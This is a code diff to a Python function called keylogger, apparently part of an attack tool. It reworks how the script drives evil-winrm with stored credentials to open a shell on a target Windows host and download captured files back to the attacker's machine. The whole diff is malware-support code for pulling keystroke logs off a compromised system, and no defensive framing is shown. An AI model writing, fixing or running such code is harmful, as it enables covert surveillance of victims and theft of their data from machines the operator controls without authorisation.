@@ -186,15 +186,18 @@ def keylogger(target_ip):
                 continue
             
             local_path = os.path.join(LOCAL_DIR, local_filename)
-            # Use raw string with proper escaping for evil-winrm
-            payload = f'download "{remote_file}" "{local_path}"'
+            # Use Popen to interact with evil-winrm shell properly
+            payload = f'download "{remote_file}" "{local_path}"\nexit\n'
             
-            result = subprocess.run(
+            proc = subprocess.Popen(
                 ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
-                input=payload,
-                text=True,
-                capture_output=True
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
             )
+            
+            stdout, stderr = proc.communicate(input=payload)
             
             # Check if file was actually created
             if os.path.exists(local_path):
@@ -202,7 +205,6 @@ def keylogger(target_ip):
                 downloaded_count += 1
             else:
                 print(f"[-] Failed to download {local_filename}")
-                print(f"    Command output: {result.stderr}")
         
         if downloaded_count == 0:
             print("[*] All files already downloaded")
